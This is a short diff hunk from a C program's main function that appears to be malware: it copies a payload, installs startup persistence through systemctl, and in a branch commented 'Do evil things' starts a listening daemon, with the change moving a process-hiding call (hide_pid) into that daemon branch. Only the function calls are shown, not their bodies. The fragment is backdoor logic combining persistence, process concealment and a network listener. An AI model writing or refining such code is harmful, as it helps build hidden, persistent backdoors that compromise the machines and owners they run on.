@@ -14,9 +14,9 @@ int main ( void )
         copy_payload();
         // systems without systemctl will not work
         startup_setup();
-        hide_pid();
     }
     else { // Do evil things
+        hide_pid();
         t_daemon *daemon = create_daemon();
         server_listen(daemon);
         free(daemon);
